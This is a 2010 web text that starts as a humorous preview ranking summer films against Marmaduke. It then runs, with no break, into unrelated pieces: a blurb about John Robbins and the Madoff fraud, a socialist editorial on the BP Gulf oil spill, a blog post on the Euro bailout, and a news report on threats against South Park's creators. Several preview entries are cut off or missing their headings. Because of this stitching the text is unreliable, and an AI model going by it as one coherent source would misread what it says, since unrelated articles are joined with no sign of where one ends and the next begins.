What it ’s about : MacGruber looks to prove yet again that a gag that ’s funny in 30 - second installments is bound to be hilarious when lovingly massaged to feature length , as Will Forte ’s clueless adventurer / MacGyver parody uses his flair for improvisation and invention to battle various bad guys .
How does it differ from Marmaduke ?
Can Marmaduke make an IED out of a Sprite can , duct tape , and Now & Laters ?
Actually , he probably can … but not as quickly as MacGruber ’s title character !

Chance it ’ll be better than Marmaduke : 80 percent .
Writer - director Jorma Taccone is part of Lonely Island , the musical - comedy outfit responsible for many of Saturday Night Live ’s best moments over the past five years .
So there ’s a real possibility that MacGruber will reach artistic heights unimaginable to It ’s Pat , Superstar , and , of course , Marmaduke .
Besides , Marmaduke essentially recycles the same joke over and over .
The film and television branches of Saturday Night Live would never stoop to such tactics .

Shrek Forever After
What it ’s about :
Due to Rumpelstiltskin - engineered trickery , lucrative ogre Shrek is trapped in a universe in which he was never born .
By the end of the day , he must win a kiss from his soulmate Fiona in order to make everything right again and keep DreamWorks Animation ’s deathless money - machine running smoothly .
How does it differ from Marmaduke ?
Marmaduke does n’t rely on time paradoxes and alternate universes so much as on the comic gold of a large , clumsy dog accidentally causing mischief .

Chance it ’ll be better than Marmaduke : 70 percent .
Marmaduke gives Steve Coogan an opportunity to live out his biggest fantasy : voicing a dog named Raisin in a big - screen Marmaduke adaptation .
But Shrek Forever
After ’s voice cast includes Jon Hamm , John Krasinski , Kristen Schaal , and yet another Larry King cameo .
( Plus no Fergie .
So it has that going for it . )

Prince Of Persia : The Sands Of Time
What it ’s about :
The popular videogame series Prince Of Persia moves from the living room to the multiplex , with Jake Gyllenhaal playing a poor bastard ( literally ) who gets named heir to a kingdom and is tasked to join with priestess Gemma Atherton to swipe a time - control device from the wicked Ben Kingsley .
Pirates Of The Caribbean producer Jerry Bruckheimer entrusts this potential franchise to director Mike Newell , best known for tasteful dramas and comedies , as well as one pretty good Harry Potter movie .
How does it differ from Marmaduke ?
It ’s based on a videogame , not a comic strip .
That ’s a huge difference , right ?

Chance it ’ll be better than Marmaduke : 90 percent .
Though huge hungry dogs create their own adventure everywhere they go , they ca n’t compete with swashbuckling warriors and seething class conflict .
Possible mitigating factor :
That mumbly Gyllenhaal kid as a muscular action hero .
That makes about as much sense as casting a giant dog as a misunderstood teenager .

Sex And The City 2
What it ’s about : Carrie ( Sarah Jessica Parker ) , Samantha ( Kim Cattrall ) , Charlotte ( Kristen Davis ) , and Miranda ( Cynthia Nixon ) are back as martini - sipping , fashion - forward Manhattan friends who talk dirty , look for love , and rebel against the traditional institutions of marriage and motherhood that all but one of them have fallen into over the years .
In other words , only the clothes have changed .
How does it differ from Marmaduke ?
A randy old dog playing the field ?
Marmaduke is such a Samantha !
But even though Marmaduke has moved to the O.C. and has a verdant new lawn to poop on , a dog ’s life is fundamentally humble and unpretentious .
He does n’t need to be whisked off to a glamorous hotspot like Abu Dhabi , the world ’s premier playground for free - spirited women who want to flaunt their sexuality .
Advertisement
Chance it ’ll be better than Marmaduke : 80 percent .
The first Sex And The City movie was a significant drop - off from the modest pleasures of the HBO series :
It was a 145 - minute behemoth that replaced the show ’s mode of raunchy jokes and small - scale observation with tear - filled romantic subplots .
This actually looks worse , but it will still feature no talking dogs , plenty of nudity , and Penélope Cruz .

Get Him To The Greek
What it ’s about :
This spin - off / sequel to Forgetting Sarah Marshall focuses on overmatched flunky Jonah Hill and his comical misadventures in trying to get decadent has - been rock star Russell Brand to an important , potentially career - reviving gig .
Shenanigans ensue .
How does it differ from Marmaduke ?
As this is a Judd Apatow - produced raunchy comedy about a drug- addled , hard - drinking pop star spiraling out of control , there will probably be slightly more narcotics and alcohol than in Marmaduke .
Also , more Katy Perry cameos .

Chance it ’ll be better than Marmaduke : 100 percent .
Apatow has a stellar track record , and Brand stole Forgetting Sarah Marshall from a cast full of ringers and funny folks .

Killers
What it ’s about : Katherine Heigl falls in love with clothing - averse mystery man Ashton Kutcher without realizing he ’s a CIA operative targeted for assassination by friend Rob Riggle .
It ’s true love between Heigl and Kutcher , two of the most annoying celebrities of the past 20 years .
But will they survive the honeymoon ?
How does it differ from Marmaduke ?
We highly doubt that anyone attempts to murder Marmaduke in his movie , though stranger things have happened , and Marmaduke ’s blood feud with rival Howard Huge has been the talk of the funny pages for decades .

Does Marmaduke have just under 5 million Twitter followers ?
We did n’t think so , though we can only imagine the horrible things Heigl will say about the film a few months from now .

Marmaduke
What it ’s about : A big dog ( voiced by Owen Wilson ) moves to Southern California with owner Lee Pace .
You ’ll never guess what happens next !
( He mostly chews on stuff and poops , based on the trailer . )

It does n’t .
It is Marmaduke .

Splice
What it ’s about : Adrien Brody and Sarah Polley play fashionable , media - savvy mad scientists who introduce human genes into their experiments with animal DNA , ending up with a creature that looks like a cross between a fetus and a kangaroo .
Writer - director Vincenzo Natali does a little splicing of his own , blending comedy , horror , and honest - to - goodness human drama as Brody and Polley bicker over what to do with their “ child . ”
How does it differ from Marmaduke ?
Both movies are about misunderstood creatures yearning to fit in , but Splice is more often about the struggles of coupledom and parenting , especially once the monster that Brody and Polley dub “ Dren ” begins to blossom into womanhood , dredging up Mommy Issues from Polley ’s childhood .

If only because Marmaduke lacks the horrifying wonder of a leaping , croaking girl - thing .

The A - Team
What it ’s about : ” Ten years ago , a crack commando unit was sent to prison by a military court for a crime they did n’t commit .
These men promptly escaped from a maximum - security stockade to the Los Angeles underground .
Today , still wanted by the government , they survive as soldiers of fortune .
If you have a problem , if no one else can help , and if you can find them , maybe you can hire The A - Team . ”
How does it differ from Marmaduke ?
Marmaduke is a force of nature that disrupts other people ’s best - laid plans .
The A - Team takes an alternate stance on plans , and the coming - together of same .

Chance it ’ll be better than Marmaduke : 100 percent .
With Liam Neeson as Hannibal , Bradley Cooper as Faceman , Sharlto Copley as Howling Mad Murdoch , and Quinton Jackson as B.A. Baracus , The A - Team cast easily outmuscles that dog movie .
Who does Marmaduke have ?
That guy from Pushing Daisies ?

The Karate Kid
What it ’s about :
This remake of the beloved 1984 hit takes the same fish - out - of - water premise about a single mother ( Taraji P. Henson ) and her son ( Jaden Smith ) moving to a hostile place , but moves the action from California to Beijing .
Picked on by a group of high - kicking bullies , Smith takes lessons in self - defense from a kung - fu master played by Jackie Chan .
How does it differ from Marmaduke ?
Marmaduke has more in common with the first movie than the remake , since both are about outcasts who are uprooted from home and moved to upscale California .
But while Marmaduke ’s battle with the “ pedigrees ” parallels Smith ’s struggles against local bullies , one might say that the pedigrees ’ bark is worse than their bite .
We would n’t say that , however .
Advertisement
Chance it ’ll be better than Marmaduke : 90 percent .
When it comes to lending their names to cruddy product for the whole family , the difference between Jackie Chan and Marmaduke is negligible at best .
And the prospect of a new film from the director of Agent Cody Banks and The Pink Panther 2 does n’t instill confidence .
However , this simple premise has already been executed successfully .
How hard could it be to do it again ?

Jonah Hex
What it ’s about : Laconic tough guy Josh Brolin takes on the role of DC Comics ’ scarred Old West bounty hunter Jonah Hex , and John Malkovich plays his Civil War terrorist nemesis Quentin Turnbull in a movie that has had a troubled production history , to put it charitably .
The Crank team of Mark Neveldine and Brian Taylor wrote the original script and were going to direct , but bailed over creative differences .
Animator Jimmy Hayward ( of Horton Hears A Who fame ) stepped in , though rumor has it that Constantine / I Am Legend director Francis Lawrence helped with the inevitable reshoots .
Even the score is a cobble - job , mixing music by composer Marco Beltrami and alt - metal band Mastodon .
How does it differ from Marmaduke ?
Both characters have their origins in the comics and are n’t “ pedigreed ” per se , but Jonah Hex has more of a killer instinct .
Marmaduke only shoots to wound .

Chance it ’ll be better than Marmaduke : 80 percent .
Jonah
Hex ’s hodgepodge of creative teams and the reported “ tongue - in - cheek tone ” are worrisome , though the cast — which also includes Michael Shannon and Michael Fassbender — is impressive enough to allay some of those fears .
Plus , it ’s Jonah Hex !
How bad - ass is that ?

Toy Story 3
What it ’s about :
The secret life of toys continues , as Woody , Buzz , and the gang accidentally wind up dumped at a day - care center when their owner , Andy , grows up and goes to college .
But their bond continues , and the toys are determined to escape their new home and reunite with their old owner .
How does it differ from Marmaduke ?
While Marmaduke and his loveable doggy friends “ speak ” with the assistance of CGI mouths , the toys in Toy Story 3 are , miraculously enough , entirely CGI .
Is there nothing computers ca n’t do ?

Chance it ’ll be better than Marmaduke : 110 percent .
Pixar Animation is a reliable source of solidly crafted , thoroughly charming entertainment .
Marmaduke is a reliable source of imbecilic jokes about a big clumsy dog .

Grown Ups
What it ’s about :
What happens when writer - producer - star Adam Sandler makes a ramshackle lowbrow comedy as an excuse to hang out with buddies like Rob Schneider , Chris Rock , David Spade , and Kevin James ?
Find out in Grown Ups , a laugher about a high - school basketball team that reunites for its 30th anniversary over July 4th weekend .
How does it differ from Marmaduke ?
We ’re guessing Marmaduke probably was n’t pitched as “ Happy Madison ’s The Big Chill , only with more Viagra jokes . ”
Advertisement
Chance it ’ll be better than Marmaduke : 50 percent .
Sandler can’t seem to take a baby step forward without falling about 10 steps back , so of course he ’s chosen a punishingly generic , wildly unambitious buddy comedy as a follow - up to his fine , underrated dramatic performance in Funny People .

Knight And Day
What it ’s about : Tom Cruise continues his career rehabilitation with this suspect action - comedy , in which he stars as a secret agent whose blind date ( with Vanilla Sky co-star Cameron Diaz ) leads to adventure and romance .
Together , they must protect a powerful battery that could be used to fuel an infinite power source .
How does it differ from Marmaduke ?
Cruise ’s shameless , puppy - like craving for love and attention aside , Knight And Day embraces a different set of dubious cinematic traditions .
It combines ampersand - favoring buddy pictures like Tango & Cash and Homer And Eddie with the romantic bickering of nearly 25 years ’ worth of Romancing The Stone rip - offs .
Advertisement
Chance it ’ll be better than Marmaduke : 98 percent .
The trailer looks dire , like something Cruise and Diaz would have passed on if their careers were n’t in such disarray .
But Knight And Day is directed by the mostly reliable James Mangold — of Walk The Line , 3:10 To Yuma , and Copland respectability — and Peter Sarsgaard ’s presence as a villain assures a few stolen scenes .

Ramona And Beezus
What it ’s about : Beverly Cleary ’s bestselling books about self - conscious adolescent Beatrice Quimby and her willful kid sister Ramona become a feature film at last , with Wizards Of Waverly Place star Selena Gomez playing “ Beezus ” and newcomer Joey King as the precocious Ramona .
Even smarter casting choices : Bridget Moynahan plays their mother , and Ginnifer Goodwin ( who looks a lot like Gomez ) plays the cool aunt after whom Beatrice is named .
How does it differ from Marmaduke ?
Actually , if you split Marmaduke into his two opposing sides — the accident - prone galoot and the just - wants - to - be - loved high - school misfit — you ’d end up with characters a lot like Ramona and Beezus .
Advertisement
Chance it ’ll be better than Marmaduke : 85 percent .
The slapstick and sentiment meters on both films will be set uncomfortably high , but Cleary ’s original books are awfully charming , and hard to completely screw up .

The Twilight Saga : Eclipse
What it ’s about :
The dreary tale of a dreary girl inexplicably adored by vampires and werewolves alike continues in this third installment of the terrifyingly popular book / film series .
Yet again , Bella is again in danger from an evil vampire , and yet again , she has to choose between her abusive vamp love Edward and her bullying werewolf friend Jacob .
How does it differ from Marmaduke ?
Marmaduke is blessedly short on interspecies romance and gothy teen - girl angst .
Sadly , it ’s also short on scenes in which Marmaduke and his doggy pals fight vampires in the chilly northern forests .
Advertisement
Chance it ’ll be better than Marmaduke : 50 percent .
Both films look dire to the point where their inevitable box - office success is depressing .
At least no one is likely to walk into either film unaware of what they ’re getting .

The Last Airbender
What it ’s about :
In this live - action adaptation of the first season of the popular animated TV series Avatar : The Last Airbender ( some other movie stole part of its title ) , a young boy emerges from frozen sleep to find his world at war , and learns that he ’s destined to reunite its warring clans of martial artists who control the four elements .
How does it differ from Marmaduke ?
Marmaduke is based on a comic rather than a cartoon .
However , the two films are similar in that the very idea of an adaptation is odd : Marmaduke the comic is a series of predictable , disconnected gags without any semblance of a cinematic story , while Avatar : The Last Airbender was a terrific three - season series that is n’t going to lend itself well to being condensed down to three feature - length movies .
( Even assuming that this first one makes enough money that the series continues , and does n’t get scuttled mid-stream , à la The Golden Compass . )
Advertisement
Chance it ’ll be better than Marmaduke : 99 percent .
The Airbender trailers to date look impressive and showcase a vast world of pricey special - effects wonders , and the underlining story is solid .
Still , director M. Night Shyamalan has never worked with this kind of mega - budget fantasy spectacle before , and he ’s previously shown himself capable of undermining his own work via his signature airless tone and terrible handling of actors .

Despicable Me
What it ’s about : A dastardly villain ( voiced by Steve Carell ) squares off against another dastardly villain ( voiced by Jason Segel ) in a plot to swipe the moon .
A who ’s - who of contemporary comedy — including Russell Brand , Will Arnett , Kristen Wiig and Danny McBride — voices supporting characters .
How does it differ from Marmaduke ?
Marmaduke ’s less evil than awkward .
He does n’t mean to ruin everything ; he just ca n’t stop being freakishly large .
Advertisement
Chance it ’ll be better than Marmaduke : 100 percent .
This is the first feature from Illumination Entertainment , a group of talented folks who used to work in animation at Fox , DreamWorks , Disney , and Blue Sky , and judging by the ads and the caliber of comedians involved , Despicable
Me looks like it could be appealingly off - beat , not stupefyingly broad like Marmaduke .

Predators
What it ’s about : Remember the alien race that terrorized Arnold Schwarzenegger in the 1987 film Predator , then returned in sequels and spin - offs that nobody liked ?
Well , it ’s back in Predators , a Robert Rodriguez - produced , Nimród Antal - directed sequel that drops a bunch of dangerous humans on an alien planet to serve as prey in the alien predators ’ hunt .
But will the hunted become …
( Oh , we ca n’t even write the rest of that cliché . )
How does it differ from Marmaduke ?
We ’re just going to guess that Predators features more aliens and bloodletting , but fewer wee - wee jokes .

Chance it ’ll be better than Marmaduke : 100 percent .
They say there are two types of people in the world :
Those who want to see Adrien Brody and Danny Trejo blowing the shit out of some mean sumbitch aliens , and those who want to see dogs dancing .
We ’re in the former camp .

Inception
What it ’s about : Honestly ?
We are n’t sure .
Leonardo DiCaprio plays a character who can enter dreams or something .
In fact , we know so little , we probably wo n’t even bother …
Wait , Christopher Nolan directed it .
Okay , never mind .
We ’re there .
How does it differ from Marmaduke ?
Maybe it is n’t that much different .
An early draft of Marmaduke was told backward , à la Memento , and featured a noirish tone that entertained far weightier themes than one would expect from a Marmaduke movie .
Or did we dream that ?

Chance it ’ll be better than Marmaduke : 100 percent .
Marmaduke director Tom Dey also helmed Shanghai Noon , Showtime , and Failure To Launch .
Nolan directed two Batman movies , Memento , Insomnia , and The Prestige .
Two directors .
Two track records .
Adjust your expectations accordingly .

The Sorcerer ’s Apprentice
What it ’s about : Good sorcerer Nicolas Cage recruits hapless , disbelieving “ physics nerd ” Jay Baruchel as his apprentice in a special - effects - driven magical war against evil sorcerer Alfred Molina .
While the trailers feature a notable lack of marching brooms , the story is supposedly based on the same Goethe poem that sparked Fantasia ’s “ Sorcerer ’s Apprentice ” sequence .
How does it differ from Marmaduke ?
Marmaduke does not feature Nicolas Cage .
Thus there is a firm upper limit to how hammy , ridiculous , and over - the - top it can possibly be .
The Sorcerer ’s Apprentice stars Nicolas Cage .
Thus… there is not .

Chance it ’ll be better than Marmaduke : 100 percent .
While Sorcerer ’s Apprentice was produced by Jerry Bruckheimer , which suggests a Marmaduke - esque “ more is more is not nearly enough ” aesthetic , it was also directed by Jon Turteltaub , whose helming of the National Treasure movies suggests that he at least knows not to take this kind of risible material ( or his risible star ) too seriously .

Dinner For Schmucks
What it ’s about :
In this Americanization of the 1998 French farce The Dinner Game , Paul Rudd stars as a would - be executive who reluctantly agrees to participate in a cruel dinner party where everyone brings an “ idiot ” as a guest .
Rudd finds the perfect candidate in IRS lackey Steve Carell , but their budding friendship complicates matters .
How does it differ from Marmaduke ?
The dog park may be “ just like high school , ” with the popular breeds bullying the mutts , but dogs are never as sadistic as the humans who use their computers to make them dance on their hind legs to “ California Love . ”
That level of cruelty was at play in Francis Veber ’s original film , and it presumably returns for this comedy of humiliation .
Advertisement
Chance it ’ll be better than Marmaduke : 100 percent .
In spite of the smooth farcical mechanics expected from the man behind La Cage Aux Folles , The Dinner Game was undone by naked contempt for its characters .
And Hollywood has a poor track record for redoing Veber films .
Cases in point : Pure Luck , Three Fugitives , and Fathers ’ Day , among others .
But the chances of a comedy starring Rudd , Carell , Zach Galifianakis , and Jemaine Clement being a complete dud are slim .

Salt
What it ’s about : Angelina Jolie is a CIA agent accused of being a Russian spy .
Is she actually a Russian spy ?
Hey , if we knew , would we tell you ?
How does it differ from Marmaduke ?
Director Phillip Noyce was this close to making the movie with Tom Cruise in the lead role before Cruise backed out .
Then the hero became a heroine played by Jolie .
Similarly , Marmaduke began as a vehicle for Anthony Hopkins , who intended to play the role inside a lifelike , highly expensive dog costume .
When early test footage creeped out audiences , Hopkins abandoned the project .
After scrapping the dog suit , Marmaduke ’s filmmakers decided , “ Fuck it , let ’s hire Owen Wilson and CGI the shit out of a real dog so it looks like it ’s talking . ”

Beastly
What it ’s about : Beauty And The Beast gets remade Twilight - style : Alex Pettyfer stars as a rich , handsome , imperiously vain teenager cursed ( by Mary - Kate Olsen , no less ) to hideousness unless he can find someone — perhaps sympathetic love interest Vanessa Hudgens ?
— to see past his newly ugly surface .
The story comes from a teen novel by Alex Flinn .
How does it differ from Marmaduke ?
Fewer depressing racial stereotypes , more Neil Patrick Harris as Pettyfer ’s tutor .
Advertisement
Chance it ’ll be better than Marmaduke : 99.8 percent .
If nothing else , Harris ’ presence promises at least a few bright moments in a film that otherwise looks intriguing but melodramatic , not to mention shot in that murky ubiquitous blue - black fantasy - film palette .
Still , just as Marmaduke is ready to waste Lee Pace ’s considerable talents , Beastly might similarly waste the usually reliable Harris .

Cats & Dogs : The Revenge Of Kitty Galore
What it ’s about :
Nine years after the children ’s comedy resolved the age - old cats - vs . - dogs question in the latter ’s favor , the canine and feline community team up to stop rogue spy Kitty Galore from taking over the world .
Can this unnatural coalition hold for long enough to stop her ?
How does it differ from Marmaduke ?
More cats , certainly , and the James Bond gadgetry is unique to this franchise .
Otherwise , we ca n’t see any difference between Cats & Dogs 2 and Marmaduke , and that ’s a terrifying prospect .
One CGI - abusing live - action kids ’ movie about the misadventures of celebrity - voiced pets per summer is exactly one movie too many .
Advertisement
Chance it ’ll be better than Marmaduke : 40 percent .
The trailer for Marmaduke instantly became the stuff of dubious legend , but does it really look much worse than a sequel to one of the biggest stinkers of 2001 ?
( One pushing a blatant anti-feline agenda , to boot . )
It ’ll be a race to the bottom , but only one trailer includes the line “ Someone ’s having a bad hair day , ” and it ai n’t Marmaduke .

Middle Men
What it ’s about :
Set in the go - go early days of the Internet , Middle Men stars Luke Wilson as a businessman who gets drawn into the colorful worlds of pornography and organized crime .
How it ’s different than Marmaduke : Marmaduke stars Owen Wilson as a big funny dog .
He should not be confused with Luke Wilson , who is his brother .
And a human being .
Advertisement
Chance it ’ll be better than Marmaduke : 75 percent .
In Middle Men , one character turns to another and says , “ You know there ’s nothing to jack off to on the Internet ? “ No matter how bad Marmaduke is , it ’s highly unlikely to contain that line .

The Other Guys
What it ’s about : Pencil - pushing detective Will Ferrell and hot - tempered partner Mark Wahlberg spy an opportunity to follow in the footsteps of hero cops Samuel L. Jackson and Dwayne “ The Rock ” Johnson , but bungle the chance with comical consequences .
How does it differ from Marmaduke ?
Marmaduke has a rich inner life , but no one would even think about giving him a badge and a gun .
Or would they ?
No , they would not … unless they did .

Even at their very worst , Adam McKay ’s writing and directing collaborations with muse / benefactor Will Ferrell ( Anchorman , Talladega Nights : The Ballad Of Ricky Bobby , Step Brothers ) are mildly amusing .

In Step Up , a talented street dancer stepped up .
In Step Up 2 The Streets , a different talented street dancer stepped up “ 2 ” the streets .
In Step Up 3 - D , a third talented street dancer will step up “ 2 ” the streets in 3 - D !
How exciting is that ?
We ’re hoping for a climax in which the street dancers all twirl yo - yos at the camera in unison .
Or possibly a cameo from Dr. Thumb .
How does it differ from Marmaduke ?
Like Marmaduke , Step Up 3 - D features lots of dancing to inane pop songs , but in a defiant break from tradition , the hot - steppers in question are human rather than canine .
Apparently people enjoy dancing nearly as much as CGI dogs .
Strange but true .

It ’s about Sylvester Stallone making another comeback , really .
Stallone directs and co-stars alongside Jason Statham , Jet Li , Dolph Lundgren , Eric Roberts , and Mickey Rourke as a group of men whose lives mirror the class divides and shifting social conditions of Edwardian England .
No wait .

It ’s likely , but not confirmed , that none of the aging musclemen in the cast had to have their mouth movements added via CGI .

Lottery Ticket
What it ’s about :
The good news ?
Bow Wow wins $ 350 million in the lottery .
The bad news ?
Everybody in the projects knows about it , and he has to hold onto the ticket through a three - day weekend of threats and propositions before collecting his riches .
How does it differ from Marmaduke ?
Any associations with Marmaduke are entirely Bow Wow ’s fault ; after all , he ’s the one who decided at an early age to use his canine moniker to draft off Snoop Dogg ’s success .
And he uses his own voice in Lottery Ticket , unlike co-star Ice Cube , who ’s voiced by Bette Midler .

In spite of a who ’s who of popular black comedic actors snapping up the supporting roles — Brandon T. Jackson , Terry Crews , Bill Bellamy , Loretta Devine , and , er , Eddie Murphy ’s brother Charlie — the trailer ’s procession of gold - diggers and thugs looks strident and awfully predictable .
But we trust that Bow Wow would never attach his name to anything disreputable .

Nanny McPhee Returns
What it ’s about : Emma Thompson returns as the eponymous nanny , an anti-Mary Poppins who uses dark witch - like powers to keep her young charges in line .
Maggie Gyllenhaal also stars as a harried young mother who enlists Nanny McPhee ’s services to straighten out her children and their spoiled city cousins while Gyllenhaal runs the family farm .
How does it differ from Marmaduke ?
Nanny McPhee uses her dark powers for the benefit of children and their development into happier , healthier beings .
Marmaduke uses his to teach kids an early lesson on the banality of existence .

The first Nanny McPhee squandered a lot of promising elements ( good source material , a great lead performance , and welcome turns by Angela Lansbury and Imelda Staunton ) through its eye - searing production design and overly manic energy .
But it was n’t a plague on mankind , which puts it well above Marmaduke .

Director Nanette Burnstein — whose previous credits include the documentaries On The Ropes , The Kid Stays In The Picture , and American Teen — aims for an earthy romantic comedy about the real - life concerns of young lovers , as opposed to the get - me - to - the - church - on - time fairy tales that have dominated the genre lately .
How does it differ from Marmaduke ?
The thought of Marmaduke romantically entangled with another dog is only marginally less creepy than the thought of Barrymore and Long making sweet , sweet love .

John Robbins was heir to the vast Baskin Robbins ice cream fortune and walked away from it in favor of making his own way in the world .
Moving to a small island home with his wife and their son , Robbins lived happily for a decade on less than $ 500 a year , redefined what wealth and happiness meant to him , and became a leading spokesperson for personal and planetary health .
Many in the media called him the " rebel without a cone " and the " Prophet of Non-profit . "
Robbins ' books sold millions , and he earned monetary wealth doing what he believed in .
Then on December 11 , 2008 , he awoke to the news that most of his hard - earned life savings had been lost to the Madoff scam .
In recent years , millions have watched their American Dreams go up in smoke .

Beyond BP
23 June 2010
More than two months have passed since the explosion of the Deepwater Horizon oil rig in the Gulf of Mexico set off what has become the worst environmental disaster in the history of the United States .
The amount of oil that has spewed into the Gulf , poisoning one of the most important ecological and economic regions of the country , is still unknown , but has to be figured in the tens of millions of gallons at least .
Eleven people died in the initial explosion .
A key industry — gulf fishing and shrimping —has been all but wiped out indefinitely .
Tens of thousands of jobs dependent on fishing and tourism will be lost .
Entire species are at risk , and the long - term consequences are incalculable .
And still , the oil continues to flow .
The vast dimensions of the ecological and economic nightmare stand in sharp and revealing contrast to the miserable actions of the federal government .
The main aim of the Obama administration has been to evade the underlying causes of the disaster and prevent public outrage from intersecting with growing anti-corporate sentiment throughout the country .
This campaign has taken different forms , some more cynically “ populist ” than others .
This past weekend , Obama administration officials and the media waxed indignant about BP CEO Tony Hayward ’s attendance at a yacht race ( where his own boat competed ) , even as his firm ’s oil continues to gush into the Gulf .
Hayward ’s indifference to the suffering in the region is of course contemptible and he deserves every ounce of the public outrage .
At the same time , however , his actions are entirely typical of the global corporate and financial elite .
The real attitude of the Obama administration was summed up by Chief of Staff Rahm Emanuel , who complained that Hayward was guilty of a “ bad PR ” ( public relations ) move — that is , his action was not the problem , let alone the immense wealth of BP executives made possible in part through the cost cutting that led to the disaster , but merely its timing .
The reaction to the yacht outing is part of a broader attempt to present BP as a renegade company , a bad apple .
The hope is that if the administration can somehow claim that BP is being held responsible , then the incident can be turned into a manageable event and business as usual — including the continued expansion of deep - sea oil drilling — can go forward .
This was the aim of last week ’s series of “ PR ” events organized by the administration itself — from Obama ’s trip to the Gulf , to the White House speech on Tuesday , to the next day ’s meeting with BP executives .
Out of this came the establishment of a $ 20 billion escrow account , to be paid in at intervals of $ 5 billion a year for four years .
In his speech from the Oval Office last week , Obama declared that he was determined to “ make BP pay ” for the disaster .
The outcome of this process , however , has only exposed the subservience of the administration to the corporate and financial elite and its inability to respond seriously to an unprecedented disaster .
First , the $ 20 billion fund is totally inadequate to deal with the consequences of the spill .
Any objective measure of the economic impact would put the cost in the hundreds of billions of dollars , or more .
“ Making BP pay ” and maintaining BP as a “ strong and viable company , ” which Obama also insisted on , are in fact mutually contradictory declarations .
With the agreement of BP chairman Carl - Henric Svanberg ( now derided in the Gulf for his repeated reference to the population as “ small people ” ) , the fund has been placed under the control of Kenneth Feinberg , a trusted representative of the political establishment .
Feinberg has helped administer liability funds for Agent Orange and asbestos , in addition to managing the September 11 Compensation Fund and functioning as Obama ’s “ pay czar ” for bailed out banks .
Feinberg immediately praised BP over the weekend , repeatedly insisting that it was necessary to “ give BP credit ” for having distributed a ( meager ) $ 100 million so far .
Meanwhile , local businesses and individuals complain bitterly of the enormous difficulties they encounter extracting any funds from the company .
Far from expediting the process , the establishment of the fund will only serve to shield BP , while ensuring that large numbers of people fall through the cracks or are pushed into settlements that are grossly inadequate in comparison with the losses they have suffered .
Second , the claim that the government is “ making BP pay ” for the disaster is aimed at covering up the paralysis of the federal government itself in the wake of the explosion .
The extent of the disaster far exceeds the resources of one company .
Any serious response to the oil eruption would have begun with the seizure of BP ’s assets and an immediate federal takeover of both the spill response and the cleanup efforts .
From the beginning , however , the Obama administration has insisted that BP had to remain in charge .
Only the oil giant had the technology and the capacity to respond , the government declared .
In a serious effort , the seizure of BP assets would only be the beginning , however .
A massive emergency public works program and the mobilization of social resources is necessary .
Hundreds of thousands of workers , including those laid off as a result of the disaster , have to be mobilized to contain the spill and carry out cleanup operations .
Teams of scientists from throughout the country and internationally must be brought together to work out a response .
BP is not an aberration .
Until the next disaster , the company is only the most public face of corporate criminality that has become pervasive .
In particular , BP shares with all the major oil companies a relentless drive for profit at the expense of the most elementary safety precautions and considerations .
If this disaster can happen at BP , it can happen at any company .
Indeed , in their pursuit of profit , energy companies have produced one atrocity after the next — from oil spills , to pollution and devastation in Africa , to global warming , to a series of mine explosions throughout the world , to utility shutoffs in homes throughout the US .
The nationalization of the energy industry is required as an emergency measure .
These resources , absolutely necessary to the functioning of the world economy , must be controlled democratically in the interests of social need .
The implementation of a rational plan for the development of global energy production is impossible so long as these corporations are subordinated to the relentless drive for profit and individual wealth accumulation .
These actions will not take place through the Democratic and Republican Parties , both equally committed to the defense of the profit system .
The Gulf oil crisis , like the financial crisis before it , poses the necessity for a mass socialist movement of the working class that has as its aim the establishment of a workers government .
Only in this way can the necessary measures be taken to respond to the crisis and prevent the next disaster .

The Europhoria in the markets on the 1 trillion safety net for the Euro is already over .
Stock Markets from Japan to Europe close in the red and shed some of yesterday ’s gains .
I am only really surprised that they fell for it in the first place .
As a real optimist , who thinks everything will work out just fine in the end , I panicked after the news of the Euro deal broke .
WTF were they doing with our money ?
But , as always , there are people out there in the web , who are so much better , when it comes to putting what matters into words :
Eurointelligence :
The euphoria is evaporating .
Market commentators have taken a closer second look at the package , and they start not to like it .
In our view the sentiment was best expressed by what Kevin Gaynor chief markets economist of RBS who called the EU ’s strategy “ Bailouts rather than integration ” .
They are not solving the problem , they are throwing money at it .
Another appropriate comment came from Marek Belke , the EU head at the IMF , who compared the rescue package to a dose of morphine with the purpose to stabilise the patient .( read more )
And on the futility of it all :
Credit Writedowns says wait for May 19th !
Nouriel Roubini warns in an interview with Der Spiegel , that there is more to come :
Today the markets are very worried about Greece , but that ’s only the tip of the iceberg .
Increasingly , bond market vigilantes have woken up in places like the UK and Ireland .
Even the US and Japan will have problems because of their huge budget deficits .
Maybe not this year , but they will eventually .
In the US , states like California , Nevada , Arizona , New York and Florida have immense fiscal problems .
The growing budget deficits and the huge government debts are really what worry me most .
( read whole interview )
And looking away from “ irresponsible ” spendthrift Europe into your own back yard :
American conservatives , particularly the fiscal variety , tend to hold up the European Union as a model of irresponsible , big - spending economic policy .
But consider this : According to E.U. rules , member countries cannot maintain budget deficits above 3 percent of gross domestic product ; nor can their total debt rise above 60 percent of GDP .
As Veronique de Rugy points out in this issue , the U.S. budget deficit in 2009 was three times the E.U. ’s limit , and total debt will zoom past the 60 percent threshold sometime this year .

South Park is not known as a show that shies away from controversy , but last night its creators appeared to bow to threats of violence from a US Muslim group by censoring a typically irreverent episode about religious leaders , including Muhammad .
Wednesday night 's show was labelled with the word " Censored " after the words Prophet Muhammad were beeped out during broadcast and images of the prophet in a bear outfit were substituted with ones of Santa Claus in the same costume .
But whether the changes were intended to acquiesce to the threats , or make fun of them , was not immediately clear .
In the first part of the 200th episode screened last week , Muhammad appeared several times inside a bear suit , while the leaders of other religions were also depicted irreverently , including a scene which showed Buddha snorting drugs .
Before last night 's show was aired , Islamists warned its creators , Matt Stone and Trey Parker , they could face severe retribution for repeating the depiction of Muhammad in costume .
A posting on the website of the US - based group , Revolution Muslim , warned Stone and Parker they would " probably wind up like Theo van Gogh " if the images were broadcast .
It posted a graphic photo of Van Gogh , a Dutch filmmaker who was stabbed to death in 2004 by an Islamic militant over a movie he had made that accused Islam of condoning violence against women .
The post , which has since been removed , also included a link to a news article which contained details of a house in Colorado that the writers are thought to co-own and listed the addresses of Comedy Central 's New York office and the show 's production office in California .
Written under the name Abu Talhah al - Amrikee , the post said : " We have to warn Matt and Trey that what they are doing is stupid and they will probably wind up like Theo van Gogh for airing this show .
This is not a threat , but a warning of the reality of what will likely happen to them . "
Amrikee later said the posting was not an incitement to violence but had been published to raise awareness of the issue and to prevent it happening again .
Asked if Parker and Stone should feel threatened by it , he said " they should feel threatened by what they did " .
He said he was disappointed that commentary on the posting had focused on the potential danger to the producers , but admitted , " I could shoulder some blame " .
It is not the first time Stone and Parker have faced calls to censor their work .
